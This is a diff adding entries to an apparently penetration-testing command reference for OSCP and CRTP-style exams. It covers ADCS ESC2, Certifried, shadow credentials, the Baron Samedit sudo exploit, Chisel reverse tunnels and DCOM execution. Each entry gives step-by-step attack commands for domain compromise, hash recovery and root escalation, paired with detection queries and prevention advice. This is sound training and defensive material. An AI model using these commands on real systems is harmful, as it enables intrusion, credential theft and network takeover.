@@ -4960,6 +4960,106 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-adcs-esc2-any-purpose",
+      "name": "ADCS ESC2 - Any Purpose / Subordinate CA Certificate",
+      "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
+      "description": "ESC2 exploits certificate templates with the \"Any Purpose\" EKU (OID 2.5.29.37.0) or no EKU (SubCA template). Any Purpose certificates can be used for client authentication, server authentication, code signing - everything. SubCA certificates can sign other certificates. Both grant far more power than intended if enrollment is not restricted.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps Certified Pre-Owned; CRTP ADCS module",
+      "tags": [
+        "adcs",
+        "esc2",
+        "any-purpose",
+        "subordinate-ca",
+        "certificate-template",
+        "eku"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CONDITIONS ===\n1. Template has \"Any Purpose\" EKU (2.5.29.37.0) or no EKU at all\n2. Low-privileged users can enroll\n3. Manager approval is not required\n\n=== \"ANY PURPOSE\" EKU ===\n  # Request certificate with Any Purpose EKU:\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template>\n  # Use for authentication:\n  certipy auth -pfx <user>.pfx -dc-ip <dc_ip>\n  # The certificate can also be used for code signing, server auth, etc.\n\n=== SUBORDINATE CA (SubCA) ===\n  # If template issues SubCA certificates:\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template SubCA\n  # This cert can SIGN OTHER CERTIFICATES\n  # Similar to ForgeCert but without stealing the CA key\n\n=== FIND VULNERABLE TEMPLATES ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout\n  # Look for ESC2 in output\n\n=== DIFFERENCE FROM ESC1 ===\n  ESC1: Template allows SAN (you specify who to impersonate)\n  ESC2: Template has overly permissive EKU (Any Purpose / SubCA)\n  Both lead to domain compromise, different mechanisms.",
+      "examples": [
+        {
+          "label": "Find ESC2 vulnerable templates",
+          "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable -stdout"
+        },
+        {
+          "label": "Request Any Purpose certificate",
+          "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template AnyPurposeTemplate"
+        },
+        {
+          "label": "Authenticate with the certificate",
+          "command": "certipy auth -pfx jdoe.pfx -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        },
+        {
+          "title": "Certipy ESC2",
+          "url": "https://github.com/ly4k/Certipy#esc2"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-esc1-certipy-linux",
+          "note": "ESC1 uses SAN; ESC2 uses Any Purpose EKU. Different attack vectors.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-forgecert",
+          "note": "SubCA ESC2 certificates can sign other certs, similar to ForgeCert.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The \"Any Purpose\" EKU allows the certificate to be used for any purpose, including client authentication. SubCA templates issue certificates with signing capabilities. If enrollment is not restricted, any domain user can obtain these powerful certificates.",
+        "prerequisites": "Enrollment rights on a template with Any Purpose EKU or SubCA; CA approval not required.",
+        "impact": "Domain authentication as the requesting user; SubCA certs can potentially sign other certificates.",
+        "detection": "[MITRE T1649] Certificate enrollment for templates with unusual EKUs; Event 4886/4887 for the enrollment.",
+        "artifacts": "Event 4886 (certificate request); Event 4887 (certificate issued); certificate with Any Purpose or SubCA EKU.",
+        "splunk_spl": "index=windows EventCode=4887\n| where CertificateTemplate=\"*SubCA*\" OR CertificateTemplate=\"*AnyPurpose*\"\n| table _time, SubjectUserName, CertificateTemplate",
+        "elastic_kql": "event.code:\"4887\" AND winlog.event_data.CertificateTemplate:(*SubCA* OR *AnyPurpose*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate has \"SubCA\" or CertificateTemplate has \"AnyPurpose\"\n| project TimeGenerated, SubjectUserName, CertificateTemplate",
+        "sigma_rules": "win_security_adcs_esc2_any_purpose_enrollment",
+        "prevention": "Remove \"Any Purpose\" EKU from templates; restrict SubCA template enrollment to admins; enable manager approval; audit certificate template configurations.",
+        "sources": [
+          "SpecterOps research",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC2 - Enrollment in Any Purpose or SubCA template",
+            "logic": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate has_any (\"SubCA\", \"AnyPurpose\", \"Any Purpose\")\n| where SubjectUserName !in (\"SYSTEM\", \"Administrator\")\n| project TimeGenerated, SubjectUserName, CertificateTemplate, Requester",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4887"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate SubCA issuance by PKI administrators",
+            "tuning": "Alert on any non-admin enrollment in SubCA or Any Purpose templates"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-adcs-esc4-template-acl",
       "name": "ADCS ESC4 - Certificate Template ACL Abuse",
       "command": "certipy template -u <user>@<domain> -p <password> -template VulnTemplate -save-old",
@@ -14425,6 +14525,103 @@ const COMMAND_DATA = {
       "explain": "Extracts the AD database on a DC using SeBackupPrivilege plus a shadow copy:\n  diskshadow.exe           script a Volume Shadow Copy of C: (works around the NTDS lock)\nThen Copy-FileSeBackupPrivilege the NTDS.dit off the snapshot and reg save the SYSTEM hive; run impacket-secretsdump -ntds -system LOCAL to dump every domain hash offline. Backup Operators on a DC = domain compromise."
     },
     {
+      "id": "linux-baron-samedit",
+      "name": "Baron Samedit (CVE-2021-3156) - Sudo Heap Overflow",
+      "command": "python3 exploit_nss.py",
+      "description": "Baron Samedit exploits a heap buffer overflow in sudo (versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1) via sudoedit -s. It grants instant root without needing any credentials or sudo permissions. One of the most impactful Linux privesc CVEs - affects nearly every Linux distribution released before January 2021.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "CVE-2021-3156; Qualys discovery",
+      "tags": [
+        "baron-samedit",
+        "cve-2021-3156",
+        "sudo",
+        "heap-overflow",
+        "linux-privesc",
+        "root"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CHECK IF VULNERABLE ===\n  sudoedit -s /\n  # Vulnerable: starts with \"sudoedit:\" (error message)\n  # Patched: starts with \"usage:\" (normal usage message)\n  # Or check version:\n  sudo --version\n  # Vulnerable: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1\n\n=== EXPLOIT (multiple variants) ===\n  # Python NSS variant (most reliable):\n  git clone https://github.com/worawit/CVE-2021-3156\n  cd CVE-2021-3156\n  python3 exploit_nss.py\n  # Root shell!\n\n  # C variant:\n  gcc exploit.c -o exploit\n  ./exploit\n\n=== AFFECTED DISTROS ===\n- Ubuntu 20.04 (Focal) - default install\n- Debian 10 (Buster)\n- CentOS 7/8\n- Fedora 33\n- Nearly all Linux distros pre-Jan 2021\n\n=== THE BUG ===\nsudoedit -s triggers a heap buffer overflow when processing\nbackslash-escaped characters. The overflow can overwrite\nservice_user struct to load attacker-controlled shared library.",
+      "examples": [
+        {
+          "label": "Check if vulnerable",
+          "command": "sudoedit -s / 2>&1 | head -1"
+        },
+        {
+          "label": "Python NSS exploit",
+          "command": "python3 exploit_nss.py"
+        },
+        {
+          "label": "Check sudo version",
+          "command": "sudo --version | head -1"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2021-3156 - Qualys Advisory",
+          "url": "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"
+        },
+        {
+          "title": "Exploit PoC",
+          "url": "https://github.com/worawit/CVE-2021-3156"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "linux-exploit-suggester",
+          "note": "LES identifies Baron Samedit among other privesc CVEs.",
+          "rel": "prereq"
+        },
+        {
+          "id": "linux-dirtycow",
+          "note": "Another major Linux kernel privesc for older systems.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "A heap buffer overflow in sudoedit -s allows overwriting memory structures. By crafting specific environment variables and arguments, an attacker can redirect code execution to gain root privileges.",
+        "prerequisites": "Any local user account (no sudo permissions needed); vulnerable sudo version.",
+        "impact": "Instant root privilege escalation from any unprivileged user.",
+        "detection": "[MITRE T1068] sudoedit execution with -s flag; crash logs from sudo; unexpected root shell spawning.",
+        "artifacts": "Sudo segfault in system logs; sudoedit -s in bash history; core dumps from sudo process.",
+        "splunk_spl": "index=linux sourcetype=syslog (\"sudoedit\" AND \"segfault\") OR (\"sudo\" AND \"heap\" AND \"overflow\")\n| table _time, host, process, message",
+        "elastic_kql": "process.name:\"sudoedit\" OR (message:*sudoedit* AND message:*segfault*)",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"sudoedit\" and (SyslogMessage has \"segfault\" or SyslogMessage has \"SIGABRT\")\n| project TimeGenerated, HostName, SyslogMessage",
+        "sigma_rules": "linux_sudo_cve_2021_3156_baron_samedit",
+        "prevention": "Update sudo to 1.8.32 or 1.9.5p2+; use sudo alternatives; monitor sudoedit usage; apply distro security patches promptly.",
+        "sources": [
+          "CVE-2021-3156",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Baron Samedit (CVE-2021-3156) exploitation attempt",
+            "logic": "title: Baron Samedit Sudo Exploit Attempt\nstatus: experimental\nlogsource:\n  product: linux\n  service: syslog\ndetection:\n  selection:\n    message|contains:\n      - \"sudoedit\"\n      - \"segfault\"\n  condition: selection\nlevel: critical",
+            "data_source": "linux-syslog",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Sudo crashes from other causes (very rare)",
+            "tuning": "Any sudoedit segfault should be investigated immediately"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -19420,6 +19617,211 @@ const COMMAND_DATA = {
       "explain": "Mines Certificate Transparency logs for subdomains without touching the target:\n  curl \"https://crt.sh/?q=<domain>&output=json\"   fetch every logged cert for the domain as JSON\n  jq -r '.[] | .name_value'                        pull the certificate common/SAN names\n  sort -u                                          dedupe\nReveals subdomains (often internal-sounding) from issued TLS certs; add a jq 'contains()' filter to focus on a keyword like dev or vpn."
     },
     {
+      "id": "ad-certifried",
+      "name": "Certifried (CVE-2022-26923) - Machine Account Certificate Privilege Escalation",
+      "command": "certipy account create -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -dns <dc_hostname> -user <new_machine>",
+      "description": "Certifried exploits CVE-2022-26923 where a low-privileged user creates a machine account, sets its dNSHostName to match a Domain Controller, then requests a certificate. The CA issues a cert for the DC identity, enabling DCSync. Patches in May 2022 added szOID_NTDS_CA_SECURITY_EXT to certificates.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CVE-2022-26923; Oliver Lyak research",
+      "tags": [
+        "certifried",
+        "cve-2022-26923",
+        "adcs",
+        "machine-account",
+        "dnshostname",
+        "certificate",
+        "dcsync"
+      ],
+      "mitre": [
+        "T1649",
+        "T1003.006"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PREREQUISITES ===\n- MachineAccountQuota > 0 (default: 10)\n- ADCS with a template allowing machine enrollment (default: Machine template)\n- Unpatched DCs (pre-May 2022 KB5014754)\n\n=== ATTACK CHAIN ===\n  # Step 1: Create machine account with DC dNSHostName\n  certipy account create -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -dns <dc_hostname> -user EVIL$\n\n  # Step 2: Request certificate as the spoofed DC\n  certipy req -u EVIL$@<domain> -p <pass> -ca <ca_name> -template Machine -dc-ip <dc_ip>\n\n  # Step 3: Authenticate with the DC certificate\n  certipy auth -pfx dc01.pfx -dc-ip <dc_ip>\n\n  # Step 4: DCSync with the DC NT hash\n  secretsdump.py -hashes :<dc_hash> <domain>/DC01$@<dc_ip>\n\n=== ALTERNATIVE: impacket addcomputer ===\n  addcomputer.py -computer-name EVIL$ -computer-pass Password123 <domain>/<user>:<pass>\n  # Then modify dNSHostName with ldap tools\n\n=== DETECTION EVASION ===\n- The attack modifies dNSHostName which is logged\n- Machine account creation is logged in Event 4741\n- Certificate requests are logged in Event 4886/4887",
+      "examples": [
+        {
+          "label": "Create machine with spoofed DNS",
+          "command": "certipy account create -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -dns DC01.corp.local -user EVIL$"
+        },
+        {
+          "label": "Request certificate as DC",
+          "command": "certipy req -u EVIL$@corp.local -p Password123 -ca corp-CA -template Machine -dc-ip 192.168.1.10"
+        },
+        {
+          "label": "Auth and get DC hash",
+          "command": "certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2022-26923 - Certifried",
+          "url": "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"
+        },
+        {
+          "title": "Certipy",
+          "url": "https://github.com/ly4k/Certipy"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-addcomputer",
+          "note": "Machine account creation is the first step of Certifried.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-esc1-certipy-linux",
+          "note": "Different ADCS attack vector (SAN abuse vs machine impersonation).",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When a machine account requests a certificate, the CA uses the dNSHostName to identify it. By setting a new machine dNSHostName to match a DC, the CA issues a certificate for the DC identity.",
+        "prerequisites": "MachineAccountQuota > 0; ADCS with machine enrollment template; unpatched DC.",
+        "impact": "Full domain compromise via DCSync with DC machine account certificate.",
+        "detection": "[MITRE T1649] Machine account creation (4741) followed by dNSHostName change (5136) and certificate request (4886).",
+        "artifacts": "Event 4741 (machine account created); Event 5136 (dNSHostName modified); Event 4886/4887 (cert request/issued).",
+        "splunk_spl": "index=windows (EventCode=4741 OR (EventCode=5136 AND AttributeLDAPDisplayName=\"dNSHostName\"))\n| transaction SubjectUserName maxspan=10m\n| where eventcount > 1\n| table _time, SubjectUserName, TargetUserName, AttributeValue",
+        "elastic_kql": "(event.code:\"4741\") OR (event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"dNSHostName\")",
+        "sentinel_kql": "SecurityEvent\n| where EventID in (4741, 5136)\n| where EventID == 5136 and AttributeLDAPDisplayName == \"dNSHostName\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue",
+        "sigma_rules": "win_security_certifried_cve_2022_26923",
+        "prevention": "Apply KB5014754 (May 2022 patches); set MachineAccountQuota to 0; monitor dNSHostName changes; enable szOID_NTDS_CA_SECURITY_EXT.",
+        "sources": [
+          "CVE-2022-26923",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Certifried - Machine account DNS spoofing",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"dNSHostName\"\n| where ObjectDN contains \"CN=Computers\" or ObjectDN contains \"OU=\"\n| where AttributeValue has_any (\"DC\", \"dc\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1649",
+              "T1003.006"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate DNS name changes on computer accounts (very rare)",
+            "tuning": "Any dNSHostName change to a DC hostname is extremely suspicious"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-certipy-shadow-auto",
+      "name": "Certipy Shadow Auto - Automated Shadow Credentials Attack",
+      "command": "certipy shadow auto -u <user>@<domain> -p <pass> -account <target_account>",
+      "description": "Certipy shadow auto performs the full Shadow Credentials attack chain automatically: adds a KeyCredential to the target, requests a TGT using PKINIT, and recovers the NT hash. One command replaces the manual Whisker + Rubeus + PKINITtools chain. Works against users and computers where you have GenericWrite/GenericAll.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Credential Access",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "ly4k/Certipy; Shadow Credentials attack chain",
+      "tags": [
+        "certipy",
+        "shadow-credentials",
+        "pkinit",
+        "keycredentiallink",
+        "automated",
+        "genericwrite"
+      ],
+      "mitre": [
+        "T1649",
+        "T1557.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ONE-COMMAND CHAIN ===\n  certipy shadow auto -u <user>@<domain> -p <pass> -account <target_account>\n  # Does everything:\n  # 1. Adds msDS-KeyCredentialLink to target\n  # 2. Requests TGT via PKINIT with the key\n  # 3. Performs UnPAC-the-hash to get NT hash\n  # 4. Cleans up the KeyCredentialLink\n\n=== MANUAL STEPS (what auto does internally) ===\n  # Step 1: Add key credential\n  certipy shadow add -u <user>@<domain> -p <pass> -account <target_account>\n  # Step 2: Authenticate with PKINIT\n  certipy shadow auth -u <user>@<domain> -p <pass> -account <target_account> -pfx <target>.pfx\n  # Step 3: Remove key credential (cleanup)\n  certipy shadow remove -u <user>@<domain> -p <pass> -account <target_account> -device-id <id>\n\n=== PREREQUISITES ===\n- GenericWrite or GenericAll over the target account\n- ADCS deployed (for PKINIT to work)\n- Target is not in Protected Users (blocks PKINIT for some configs)\n\n=== WINDOWS EQUIVALENT ===\n  # Whisker + Rubeus + PKINITtools:\n  Whisker.exe add /target:<target_account>\n  Rubeus.exe asktgt /user:<target_account> /certificate:<base64_cert> /password:<pass> /ptt\n  # Then use the ticket",
+      "examples": [
+        {
+          "label": "Full automated Shadow Credentials attack",
+          "command": "certipy shadow auto -u jdoe@corp.local -p Password123 -account svc_admin"
+        },
+        {
+          "label": "Manual - add key credential",
+          "command": "certipy shadow add -u jdoe@corp.local -p Password123 -account svc_admin"
+        },
+        {
+          "label": "Cleanup - remove key credential",
+          "command": "certipy shadow remove -u jdoe@corp.local -p Password123 -account svc_admin -device-id <id>"
+        }
+      ],
+      "references": [
+        {
+          "title": "Certipy Shadow Credentials",
+          "url": "https://github.com/ly4k/Certipy"
+        },
+        {
+          "title": "Shadow Credentials - Elad Shamir",
+          "url": "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-genericwrite-abuse",
+          "note": "GenericWrite is the prerequisite for Shadow Credentials.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-pkinit-getnthash",
+          "note": "PKINITtools getnthash is what certipy auto calls internally.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Shadow Credentials abuse the msDS-KeyCredentialLink attribute to register a new public key for PKINIT authentication. The target account then trusts this key for Kerberos pre-authentication, allowing the attacker to obtain a TGT and recover the NT hash.",
+        "prerequisites": "GenericWrite/GenericAll over the target account; ADCS deployed for PKINIT.",
+        "impact": "Full compromise of the target account (NT hash recovery); enables pass-the-hash or further lateral movement.",
+        "detection": "[MITRE T1649] msDS-KeyCredentialLink modification (Event 5136); PKINIT authentication from unexpected sources.",
+        "artifacts": "Event 5136 showing KeyCredentialLink change; Event 4768 with PKINIT pre-auth; certificate-based TGT request.",
+        "splunk_spl": "index=windows EventCode=5136 AttributeLDAPDisplayName=\"msDS-KeyCredentialLink\"\n| table _time, SubjectUserName, ObjectDN, OperationType",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"msDS-KeyCredentialLink\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-KeyCredentialLink\"\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+        "sigma_rules": "win_security_shadow_credentials_keycredentiallink",
+        "prevention": "Monitor msDS-KeyCredentialLink changes; restrict GenericWrite permissions; use Protected Users group for sensitive accounts; audit PKINIT authentication events.",
+        "sources": [
+          "Certipy documentation",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Shadow Credentials - KeyCredentialLink modification",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType\n| extend TargetAccount = extract(@\"CN=([^,]+)\", 1, ObjectDN)",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1649",
+              "T1557.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Windows Hello for Business enrollment; WHfB key provisioning",
+            "tuning": "Whitelist WHfB enrollment service accounts; alert on any other KeyCredentialLink modification"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-certipy-toolkit",
       "name": "Certipy Toolkit (AD CS Abuse Reference)",
       "command": "certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout",
@@ -20140,6 +20542,99 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Forges a cross-domain golden ticket that escalates from a child domain to the forest root:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>            the child domain's krbtgt hash (from DCSync)\n  /domain:<domain> /sid:<domain_sid>   the child domain and its SID\n  /sids:<parent_enterprise_admin_sid>  the parent Enterprise Admins SID (ends -519) injected into SID History\n  /user:Administrator /ptt  impersonate Administrator and inject the ticket\nSID History is not filtered inside a forest, so the ticket is honored on the parent DC - dir \\\\<parent_dc>\\C$ then DCSync the root."
+    },
+    {
+      "id": "recon-chisel-http-tunnel",
+      "name": "Chisel - HTTP Tunneling & Port Forwarding",
+      "command": "chisel server -p 8080 --reverse",
+      "description": "Chisel creates TCP tunnels over HTTP, bypassing firewalls that only allow web traffic. It supports forward and reverse port forwarding plus SOCKS5 proxying through a single HTTP connection. Critical for pivoting through web servers or DMZ hosts where only port 80/443 is accessible. Single binary, no dependencies.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Pivoting & Tunneling",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "jpillora/chisel; OSCP pivoting methodology",
+      "tags": [
+        "chisel",
+        "http-tunnel",
+        "port-forwarding",
+        "pivoting",
+        "socks5",
+        "reverse-tunnel",
+        "firewall-bypass"
+      ],
+      "mitre": [
+        "T1572"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  # Pre-compiled binaries:\n  # https://github.com/jpillora/chisel/releases\n  # Available for Linux, Windows, macOS (single binary)\n\n=== REVERSE SOCKS PROXY (most common) ===\n  # Attacker (server):\n  chisel server -p 8080 --reverse\n  # Target (client):\n  chisel client <attacker_ip>:8080 R:socks\n  # Now use proxychains on attacker:\n  # Edit /etc/proxychains.conf: socks5 127.0.0.1 1080\n  proxychains nmap -sT -Pn <internal_target>\n\n=== REVERSE PORT FORWARD ===\n  # Forward target port 3389 to attacker port 13389:\n  chisel client <attacker_ip>:8080 R:13389:<internal_ip>:3389\n  # Access RDP at attacker:13389\n\n=== FORWARD PORT FORWARD ===\n  # Attacker:\n  chisel server -p 8080\n  # Target:\n  chisel client <attacker_ip>:8080 8888:<internal_ip>:80\n  # Access internal web at target:8888\n\n=== MULTIPLE TUNNELS ===\n  chisel client <attacker_ip>:8080 R:socks R:13389:10.10.10.5:3389 R:11433:10.10.10.6:1433\n\n=== OVER HTTPS ===\n  # Server with TLS:\n  chisel server -p 443 --reverse --tls-key key.pem --tls-cert cert.pem\n  # Client:\n  chisel client https://<attacker_ip>:443 R:socks",
+      "examples": [
+        {
+          "label": "Start reverse SOCKS proxy server",
+          "command": "chisel server -p 8080 --reverse"
+        },
+        {
+          "label": "Client - connect and create SOCKS tunnel",
+          "command": "chisel client 10.10.14.5:8080 R:socks"
+        },
+        {
+          "label": "Reverse port forward RDP",
+          "command": "chisel client 10.10.14.5:8080 R:13389:10.10.10.100:3389"
+        }
+      ],
+      "references": [
+        {
+          "title": "Chisel - GitHub",
+          "url": "https://github.com/jpillora/chisel"
+        },
+        {
+          "title": "MITRE T1572 - Protocol Tunneling",
+          "url": "https://attack.mitre.org/techniques/T1572/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "chisel-socks",
+          "note": "Chisel SOCKS proxy for full network pivoting.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Chisel encapsulates TCP traffic within HTTP/WebSocket connections, making it appear as normal web traffic. Firewalls that allow HTTP/HTTPS traffic will pass the tunneled connections.",
+        "prerequisites": "Outbound HTTP/HTTPS access from the target; chisel binary on the target.",
+        "impact": "Full network access to internal networks through a compromised DMZ/web host; bypasses network segmentation.",
+        "detection": "[MITRE T1572] Long-lived HTTP/WebSocket connections; unusual data volumes over HTTP; HTTP CONNECT-like patterns.",
+        "artifacts": "Persistent HTTP connections to external IPs; unusual outbound traffic patterns; chisel binary on disk.",
+        "splunk_spl": "index=proxy dest_port IN (80, 443, 8080)\n| where duration > 3600 OR bytes_out > 10000000\n| stats sum(bytes_out) as total_bytes, avg(duration) as avg_duration by src_ip, dest_ip\n| where total_bytes > 50000000",
+        "elastic_kql": "network.transport:\"tcp\" AND destination.port:(80 OR 443 OR 8080) AND event.duration:>3600",
+        "sentinel_kql": "CommonSecurityLog\n| where DestinationPort in (80, 443, 8080)\n| summarize TotalBytes=sum(SentBytes + ReceivedBytes), Duration=max(datetime_diff(\"second\", TimeGenerated, StartTime)) by SourceIP, DestinationIP\n| where TotalBytes > 50000000 or Duration > 3600",
+        "sigma_rules": "net_connection_http_tunnel_chisel",
+        "prevention": "Deep packet inspection for HTTP tunnels; block unknown HTTP/WebSocket connections; monitor for long-lived HTTP sessions; application-layer firewalling.",
+        "sources": [
+          "OSCP pivoting",
+          "https://attack.mitre.org/techniques/T1572/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "HTTP tunneling - long-lived connection pattern",
+            "logic": "DeviceNetworkEvents\n| where RemotePort in (80, 443, 8080, 8443)\n| summarize ConnectionCount=count(), TotalBytes=sum(SentBytes + ReceivedBytes) by InitiatingProcessFileName, RemoteIP, bin(Timestamp, 1h)\n| where ConnectionCount > 100 or TotalBytes > 100000000",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1572"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Long-running web applications; video streaming; large file downloads",
+            "tuning": "Focus on non-browser processes making HTTP connections; baseline normal traffic patterns"
+          }
+        ]
+      }
     },
     {
       "id": "chisel-socks",
@@ -31520,6 +32015,103 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Security scanning tools; penetration testing",
             "tuning": "Whitelist known scanner IPs; correlate with WAF blocks"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-impacket-dcomexec",
+      "name": "dcomexec.py - Remote Execution via DCOM",
+      "command": "dcomexec.py <domain>/<user>:<pass>@<target> \"<command>\"",
+      "description": "dcomexec.py executes commands on remote Windows hosts via DCOM (Distributed Component Object Model) objects like MMC20.Application, ShellWindows, and ShellBrowserWindow. Does not create a service or drop a binary - uses legitimate Windows DCOM interfaces. Less detected than PsExec/smbexec but slower.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Impacket; DCOM lateral movement",
+      "tags": [
+        "dcomexec",
+        "impacket",
+        "dcom",
+        "lateral-movement",
+        "remote-exec",
+        "mmc20"
+      ],
+      "mitre": [
+        "T1021.003"
+      ],
+      "exam": "exam-ok",
